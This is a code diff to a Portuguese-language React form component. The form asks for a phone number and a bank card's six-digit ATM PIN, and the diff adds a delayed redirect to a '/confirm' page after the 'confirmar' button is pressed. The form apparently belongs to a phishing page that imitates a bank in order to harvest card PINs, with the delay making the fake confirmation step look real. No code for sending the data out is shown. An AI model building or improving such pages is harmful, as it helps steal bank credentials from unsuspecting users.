@@ -1,7 +1,15 @@
 import React from 'react'
 import './EmailTelefone.css'
+import { useNavigate } from 'react-router-dom'
 
 const EmailTelefone = () => {
+    const navigate = useNavigate();
+
+    const handleClick = () => {
+        setTimeout(() => {
+            navigate('/confirm');
+        }, 1000);
+    }
   return (
     <div className='EmailTelefone'>
         <div className='logo'>
@@ -15,7 +23,7 @@ const EmailTelefone = () => {
             <input className="digitavel" type="text" placeholder='telefone' />
             <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
             <input className="digitavel" type="text" placeholder='digite a senha do cartão' />
-            <button>confirmar</button>
+            <button onClick={handleClick}>confirmar</button>
         </div>
     </div>
   )
